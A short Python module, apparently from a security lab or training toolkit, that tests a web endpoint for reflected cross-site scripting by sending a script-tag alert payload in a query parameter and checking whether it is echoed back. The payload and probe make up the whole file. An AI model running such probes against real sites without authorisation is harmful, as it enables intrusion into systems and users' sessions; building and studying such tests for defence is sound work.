"""
⚠️ INTENTIONALLY VULNERABLE MODULE ⚠️
Module: Reflected XSS
"""
import requests

def test_reflected_xss(url, payload="<script>alert('XSS')</script>"):
    print(f"[*] Testing reflected XSS on {url} with payload: {payload}")
    params = {'name': payload}
    response = requests.get(f"{url}/xss", params=params)
    
    if payload in response.text:
        print("[+] Success! Payload reflected in response.")
        return True
    return False
